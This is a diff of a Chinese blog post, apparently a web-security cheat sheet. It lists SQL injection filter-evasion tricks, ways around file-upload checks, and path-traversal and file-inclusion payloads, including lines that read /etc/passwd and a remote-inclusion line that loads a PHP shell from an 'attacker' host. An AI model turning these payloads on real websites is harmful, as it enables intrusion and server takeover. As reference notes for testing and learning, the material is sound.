@@ -9,7 +9,11 @@
 <hr>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
 <li>url base64 utf-8… (全部编码或个别编码)</li>
-<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3>SeLeT   不多解释<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3></li>
+<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li>
+</ul>
+<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
+<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
 <li>两个空格代替一个空格，TAB代替空格</li>
 <li>用注释符号代替空格 /**/</li>
 <li>用括号代替空格 </li>
@@ -47,13 +51,19 @@
 <li>@@user ==&gt; user()</li>
 <li>@@datadir ==&gt; datadir()</li>
 </ul>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>当服务器会自动加上.php<br>“.”  “%00” —&gt; ull的url编码<br><code>?file=a.doc..php</code><br><code>?file=a.doc%00.php</code>   </p>
-<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>加特殊字符  </p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
 <ul>
-<li>空格 &lt; &gt;  </li>
-<li>././././  </li>
-<li>pjpjp(不存在目录)/../</li>
+<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
+<li>文件类型限制     burpsuite 修改image/jpeg</li>
+<li>文件大小限制     修改信息文件限制大小参数</li>
+<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
 </ul>
+<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
+<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
+<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
+<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
+<p>以上偷取葛大佬的部分栗子</p>
 ]]></content>
       
         
